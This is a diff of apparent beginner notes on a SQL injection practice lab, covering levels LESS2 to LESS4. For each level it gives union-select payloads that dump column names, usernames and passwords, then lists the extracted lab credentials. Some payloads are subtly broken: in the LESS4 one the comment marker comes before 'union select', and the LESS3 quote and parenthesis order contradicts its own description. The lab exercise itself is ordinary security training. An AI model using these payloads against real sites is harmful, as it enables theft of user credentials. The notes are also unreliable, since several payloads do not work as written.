@@ -24,9 +24,38 @@ We can dump contents
 #LESS2
 The website says,Please input the ID as parameter with numeric value.
 This time when we input use ?id=1'-- - doesn't work.
-So we put ' before the 1 and change it as ?id='1' now it work.
-Now we can comment it -- - 
-Now we dump contents using the payloads.
+So we put ' before the 1 and change it as ?id='1' as payload.
+Now we can comment it ?id='1' -- - 
+Now we can dump contents using the payloads.
 
 #payloads to dump
 to find column_name ?id='-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+
+We have more payloads that can we do and get contents of database
+
+#LESS3
+The website says,Please input the ID as parameter with numeric value.
+This time when we input use ?id=1'-- - nor ?id='1'-- - doesn't work.
+So we put ) before the ' and change it as ?id=1)' as payload.
+No we can comment it ?id=1)'-- -
+Now we can dump contents using payloads
+
+#payloads to dump
+to find data /?id=-1') union select 1,group_concat(username),3 from users
+We have more payloads that can we do and get contents of database
+
+#LESS4
+The website says,Please input the ID as parameter with numeric value.
+We have to use ') ' as payload 
+Now can comment it using ?id=1' ")-- -
+Now we can dump contents using payloads
+
+#payloads to dump 
+?id=-1' ")-- - union select 1,group_concat(username),group_concat(password) from users
+We have more payloads that can we do and get contents of database.
+
+#contents of database
+1.databasename = security
+2.tables = emails,referers,uagents,users
+3.columns = CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,USER,id,password,username
+4.usernames = Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
+password = Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
